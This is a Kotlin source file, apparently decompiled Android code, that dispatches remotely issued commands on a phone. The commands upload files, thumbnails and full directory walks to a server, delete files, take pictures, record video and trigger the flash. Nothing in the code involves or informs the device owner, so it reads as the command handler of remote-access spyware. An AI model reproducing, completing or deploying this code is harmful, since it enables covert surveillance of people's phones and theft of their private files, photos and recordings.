package com.hawkshaw.library.features.media

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.lifecycle.LifecycleOwner
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import kotlin.coroutines.Continuation
import com.hawkshaw.library.features.media.camera.recordVideo as recordVideoWithCamera
import com.hawkshaw.library.features.media.camera.takePicture as takePictureWithCamera
import com.hawkshaw.library.features.media.filecrud.pushFile as pushFileToServer
import com.hawkshaw.library.features.media.filecrud.pushFiles as pushFilesToServer
import com.hawkshaw.library.features.media.filecrud.pushThumbnailsNew as pushThumbnailsNewToServer
import com.hawkshaw.library.features.media.files.pushFileExplorerWalkV2 as pushFileExplorerWalkToSever
import com.hawkshaw.library.features.misc.flash as flashDevice

private const val TAG = "MediaHandler"

/**
 * Handle a file command, processing based on the command type
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun handleFileCommand(command: Command, continuation: Continuation<Any?>? = null): Any {
    Log.d(TAG, "[DEBUG] handleFileCommand called. Command: ${command.type}, Continuation provided: ${continuation != null}")
    val result = when (command.type) {
        Command.CommandType.PushFile -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched PushFile. Request: ${command.fileRequest}")
            pushFile(command.fileRequest)
        }
        Command.CommandType.PushFiles -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched PushFiles. Request: ${command.filesRequest}")
            pushFiles(command.filesRequest)
        }
        Command.CommandType.PushThumbnails -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched PushThumbnails. Request: ${command.thumbnailRequest}")
            pushThumbnails(command.thumbnailRequest) // The parameter will be ignored by `pushThumbnailsNewToServer`
        }
        Command.CommandType.DeleteFile -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched DeleteFile. Request: ${command.deleteFileRequest}")
            deleteFile(command.deleteFileRequest)
            Unit
        }
        Command.CommandType.DeletePendingPushFiles -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched DeletePendingPushFiles. Request: ${command.deletePendingPushFilesRequest}")
            deletePendingPushFiles(command.deletePendingPushFilesRequest)
            Unit
        }
        Command.CommandType.PushFileExplorerWalk -> {
            Log.d(TAG, "[DEBUG] handleFileCommand: Matched PushFileExplorerWalk.")
            pushFileExplorerWalk(continuation) // Pass continuation if needed by `pushFileExplorerWalkToSever`
        }
        else -> {
            Log.w(TAG, "[DEBUG] handleFileCommand: Unsupported file command: ${command.type}")
            Logger.e(
                TAG,
                "Unsupported file command: ${command.type}",
                b = false,
                i = 12,
                nothing = null
            )
            Unit
        }
    }
    Log.d(TAG, "[DEBUG] handleFileCommand finished for command ${command.type}. Result: $result")
    return result
}

/**
 * Delete a file based on the provided request
 */
private fun deleteFile(deleteFileRequest: Command.DeleteFileRequest?) {
    Log.d(TAG, "[DEBUG] deleteFile called. Request: $deleteFileRequest")
    if (deleteFileRequest != null) {
        Log.d(TAG, "[DEBUG] deleteFile: Checking WRITE_EXTERNAL_STORAGE permission.")
        if (!ManifestPermissionsKt.hasPermission(App.getContext(), "android.permission.WRITE_EXTERNAL_STORAGE")) {
            Log.e(TAG, "[DEBUG] deleteFile: Permission WRITE_EXTERNAL_STORAGE denied.")
            Logger.e(
                TAG,
                "DeleteFiles: You don't have permission to write storage",
                b = false,
                i = 12,
                nothing = null
            )
            return
        }
        Log.d(TAG, "[DEBUG] deleteFile: Permission WRITE_EXTERNAL_STORAGE granted.")
        
        val file = File(deleteFileRequest.path)
        Log.d(TAG, "[DEBUG] deleteFile: Target file: ${file.absolutePath}, Exists: ${file.exists()}")
        if (file.exists()) {
            val isDeleted = file.delete()
            Log.d(TAG, "[DEBUG] deleteFile: Deletion attempt result for ${file.path}: $isDeleted")
            Logger.v(
                TAG,
                "DeleteFile: ${if (isDeleted) "File deleted" else "File not deleted"}, ${file.path}",
                false,
                4,
                null
            )
        } else {
            Log.w(TAG, "[DEBUG] deleteFile: File does not exist, ${deleteFileRequest.path}")
            Logger.v(
                TAG,
                "DeleteFile: File does not exist, ${deleteFileRequest.path}",
                false,
                4,
                null
            )
        }
    } else {
        Log.d(TAG, "[DEBUG] deleteFile: deleteFileRequest is null. No action taken.")
    }
}

/**
 * Delete pending push files
 */
private suspend fun deletePendingPushFiles(request: Command.DeletePendingPushFilesRequest?): Any {
    Log.d(TAG, "[DEBUG] deletePendingPushFiles called. Request: $request")
    Logger.v(TAG, "Deleting pending push files", false, 4, null)
    // Assuming this function is purely for internal state management and doesn't return anything meaningful to the client
    Log.d(TAG, "[DEBUG] deletePendingPushFiles returning Unit.")
    return Unit
}

/**
 * Handle media commands (This function seems to just delegate to `startMediaService`)
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun handleMediaCommand(command: Command): Any {
    Log.d(TAG, "[DEBUG] handleMediaCommand (single arg) called. Command: ${command.type}")
    // Start media service to handle the command asynchronously
    startMediaService(command)
    Log.d(TAG, "[DEBUG] handleMediaCommand (single arg) returning Unit after calling startMediaService.")
    return Unit
}

/**
 * Push a file to the server
 */
suspend fun pushFile(fileRequest: Command.FileRequest?): Any {
    Log.d(TAG, "[DEBUG] pushFile called. Request: $fileRequest")
    if (fileRequest == null) {
        Log.d(TAG, "[DEBUG] pushFile: fileRequest is null. Returning Unit.")
        return Unit
    }

    Logger.v(TAG, "Pushing file: ${fileRequest.path}", false, 4, null)
    Log.d(TAG, "[DEBUG] pushFile: Calling pushFileToServer for path: ${fileRequest.path}")
    val result = pushFileToServer(fileRequest)
    Log.d(TAG, "[DEBUG] pushFile: pushFileToServer returned: $result")
    return result
}

@RequiresApi(Build.VERSION_CODES.O)
suspend fun pushFileExplorerWalk(continuation: Continuation<Any?>?): Any {
    Log.d(TAG, "[DEBUG] pushFileExplorerWalk called. Continuation provided: ${continuation != null}")
    Logger.v(TAG, "Pushing file explorer walk", false, 4, null)
    
    val effectiveContinuation = continuation ?: object : Continuation<Any> {
        override val context = Dispatchers.IO 
        override fun resumeWith(result: Result<Any>) { 
            Log.d(TAG, "[DEBUG] pushFileExplorerWalk default continuation resumeWith called. Result: $result")
            /* Handle completion if needed */ 
        }
    }
    Log.d(TAG, "[DEBUG] pushFileExplorerWalk: Calling pushFileExplorerWalkToSever.")
    val result = pushFileExplorerWalkToSever(effectiveContinuation)
    Log.d(TAG, "[DEBUG] pushFileExplorerWalk: pushFileExplorerWalkToSever returned: $result")
    return result
}

/**
 * Push multiple files to server
 */
suspend fun pushFiles(filesRequest: Command.FilesRequest?): Any {
    Log.d(TAG, "[DEBUG] pushFiles called. Request: $filesRequest")
    if (filesRequest == null) {
        Log.d(TAG, "[DEBUG] pushFiles: filesRequest is null. Returning Unit.")
        return Unit
    }

    val numFiles = filesRequest.paths.size
    Log.d(TAG, "[DEBUG] pushFiles: Number of paths in request: $numFiles")
    Logger.v(TAG, "Pushing files: $numFiles files", false, 4, null)
    Log.d(TAG, "[DEBUG] pushFiles: Calling pushFilesToServer.")
    val result = pushFilesToServer(filesRequest)
    Log.d(TAG, "[DEBUG] pushFiles: pushFilesToServer returned: $result")
    return result
}

/**
 * Push thumbnails to server
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun pushThumbnails(thumbnailRequest: Command.ThumbnailRequest?): Any {
    Log.d(TAG, "[DEBUG] pushThumbnails called. Request (will be unused): $thumbnailRequest")
    Logger.v(TAG, "Pushing thumbnails (fetching pending paths from server)", false, 4, null)
    Log.d(TAG, "[DEBUG] pushThumbnails: Calling pushThumbnailsNewToServer.")
    val result = pushThumbnailsNewToServer()
    Log.d(TAG, "[DEBUG] pushThumbnails: pushThumbnailsNewToServer returned: $result")
    return result
}

/**
 * Record audio
 */
private fun recordAudio(context: LifecycleOwner, request: Command.RecordAudioRequest?) {
    Log.d(TAG, "[DEBUG] recordAudio called. Context: $context, Request: $request")
    if (request == null) {
        Log.d(TAG, "[DEBUG] recordAudio: request is null. No action taken.")
        return
    }

    Log.d(TAG, "[DEBUG] recordAudio: Checking RECORD_AUDIO permission.")
    if (!ManifestPermissionsKt.hasPermission(App.getContext(), "android.permission.RECORD_AUDIO")) {
        Log.e(TAG, "[DEBUG] recordAudio: Permission RECORD_AUDIO denied.")
        Logger.e(
            TAG,
            "RecordAudio: You don't have permission to record audio",
            b = false,
            i = 12,
            nothing = null
        )
        return
    }
    Log.d(TAG, "[DEBUG] recordAudio: Permission RECORD_AUDIO granted.")
    
    Logger.v(TAG, "Recording audio", false, 4, null)
    Log.d(TAG, "[DEBUG] recordAudio: Audio recording logic should be handled by a dedicated class. (End of function)")
    // This should be handled by a dedicated audio recording class
}

/**
 * Record video
 */
suspend fun recordVideo(context: LifecycleOwner, request: Command.RecordVideoRequest?): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] recordVideo called. Context: $context, Request: $request. Running on Dispatchers.IO")
    if (request == null) {
        Log.d(TAG, "[DEBUG] recordVideo: request is null. Returning Unit.")
        return@withContext Unit
    }

    Log.d(TAG, "[DEBUG] recordVideo: Checking CAMERA permission.")
    if (!ManifestPermissionsKt.hasPermission(App.getContext(), "android.permission.CAMERA")) {
        Log.e(TAG, "[DEBUG] recordVideo: Permission CAMERA denied.")
        Logger.e(
            TAG,
            "RecordVideo: You don't have permission to access the camera",
            b = false,
            i = 12,
            nothing = null
        )
        return@withContext Unit
    }
    Log.d(TAG, "[DEBUG] recordVideo: Permission CAMERA granted.")
    
    Logger.v(TAG, "Recording video", false, 4, null)
    try {
        Log.d(TAG, "[DEBUG] recordVideo: Calling recordVideoWithCamera.")
        val result = recordVideoWithCamera(App.getContext(), context, request)
        Log.d(TAG, "[DEBUG] recordVideo: recordVideoWithCamera returned: $result")
        return@withContext result
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] recordVideo: Error recording video: ${e.message}", e)
        Logger.e(TAG, "Error recording video: ${e.message}", b = false, i = 12, nothing = null)
        return@withContext Unit
    }
}

/**
 * Start media service
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun startMediaService(command: Command): Any {
    Log.d(TAG, "[DEBUG] startMediaService called. Command: ${command.type}")
    Logger.v(TAG, "Starting media service with command: ${command.type}", false, 4, null)
    Log.d(TAG, "[DEBUG] startMediaService: Calling MediaService.handleMediaCommand.")
    MediaService.handleMediaCommand(command) // Assuming this is a suspend fun or handles its own async
    Log.d(TAG, "[DEBUG] startMediaService: MediaService.handleMediaCommand call completed. Returning Unit.")
    return Unit
}

/**
 * Take a picture
 */
suspend fun takePicture(context: LifecycleOwner, request: Command.TakePictureRequest?): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] takePicture called. Context: $context, Request: $request. Running on Dispatchers.IO")
    if (request == null) {
        Log.d(TAG, "[DEBUG] takePicture: request is null. Returning Unit.")
        return@withContext Unit
    }

    Log.d(TAG, "[DEBUG] takePicture: Checking CAMERA permission.")
    if (!ManifestPermissionsKt.hasPermission(App.getContext(), "android.permission.CAMERA")) {
        Log.e(TAG, "[DEBUG] takePicture: Permission CAMERA denied.")
        Logger.e(
            TAG,
            "TakePicture: You don't have permission to access the camera",
            b = false,
            i = 12,
            nothing = null
        )
        return@withContext Unit
    }
    Log.d(TAG, "[DEBUG] takePicture: Permission CAMERA granted.")
    
    Logger.v(TAG, "Taking picture", false, 4, null)
    try {
        Log.d(TAG, "[DEBUG] takePicture: Calling takePictureWithCamera.")
        val result = takePictureWithCamera(App.getContext(), context, request)
        Log.d(TAG, "[DEBUG] takePicture: takePictureWithCamera returned: $result")
        return@withContext result
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] takePicture: Error taking picture: ${e.message}", e)
        Logger.e(TAG, "Error taking picture: ${e.message}", b = false, i = 12, nothing = null)
        return@withContext Unit
    }
}

/**
 * Handle flash
 */
suspend fun flash(request: Command.FlashRequest?): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] flash called. Request: $request. Running on Dispatchers.IO")
    if (request == null) {
        Log.d(TAG, "[DEBUG] flash: request is null. Returning Unit.")
        return@withContext Unit
    }

    Log.d(TAG, "[DEBUG] flash: Checking CAMERA permission.")
    if (!ManifestPermissionsKt.hasPermission(App.getContext(), "android.permission.CAMERA")) {
        Log.e(TAG, "[DEBUG] flash: Permission CAMERA denied.")
        Logger.e(
            TAG,
            "Flash: You don't have permission to access the camera",
            b = false,
            i = 12,
            nothing = null
        )
        return@withContext Unit
    }
    Log.d(TAG, "[DEBUG] flash: Permission CAMERA granted.")
    
    Logger.v(TAG, "Activating flash", false, 4, null)
    Log.d(TAG, "[DEBUG] flash: Calling flashDevice.")
    val result = flashDevice(App.getContext(), request) // Pass Context here
    Log.d(TAG, "[DEBUG] flash: flashDevice returned: $result")
    return@withContext result
}

/**
 * Main function to handle various media commands.
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun handleMediaCommand(context: Context, command: Command): Any {
    val type = command.type
    Log.d(TAG, "[DEBUG] handleMediaCommand (with Context) called. Context: $context, Command Type: $type, Command details: $command")
    
    Logger.v(TAG, "Handling media command: $type", false, 4, null)
    val result = when (type) {
        Command.CommandType.Flash -> {
            Log.d(TAG, "[DEBUG] handleMediaCommand (with Context): Matched Flash. Request: ${command.flashRequest}")
            flash(command.flashRequest)
        }
        Command.CommandType.TakePicture -> {
            Log.d(TAG, "[DEBUG] handleMediaCommand (with Context): Matched TakePicture. Request: ${command.takePictureRequest}")
            takePicture(context as LifecycleOwner, command.takePictureRequest)
        }
        Command.CommandType.RecordVideo -> {
            Log.d(TAG, "[DEBUG] handleMediaCommand (with Context): Matched RecordVideo. Request: ${command.recordVideoRequest}")
            recordVideo(context as LifecycleOwner, command.recordVideoRequest)
        }
        Command.CommandType.RecordAudio -> {
            Log.d(TAG, "[DEBUG] handleMediaCommand (with Context): Matched RecordAudio. Request: ${command.recordAudioRequest}")
            recordAudio(context as LifecycleOwner, command.recordAudioRequest)
            Unit
        }
        else -> {
            Log.d(TAG, "[DEBUG] handleMediaCommand (with Context): Command type $type not directly handled, delegating to handleFileCommand.")
            handleFileCommand(command)
        }
    }
    Log.d(TAG, "[DEBUG] handleMediaCommand (with Context) finished for command ${command.type}. Result: $result")
    return result
}
